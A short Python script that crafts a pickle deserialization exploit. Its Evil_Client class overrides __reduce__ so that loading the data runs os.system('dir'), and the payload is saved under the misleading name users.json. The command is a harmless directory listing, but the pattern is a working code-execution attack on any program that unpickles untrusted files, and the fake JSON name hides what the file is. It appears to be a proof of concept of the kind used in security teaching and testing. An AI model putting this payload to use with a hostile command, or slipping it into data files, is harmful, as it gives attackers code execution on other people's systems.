import os
import pickle

class Evil_Client(object):
    def __reduce__(self):
        return (os.system,('dir',))

evli_client = Evil_Client()
pickle_data = pickle.dumps(evli_client)

with open("users.json","wb") as f:
        f.write(pickle_data)


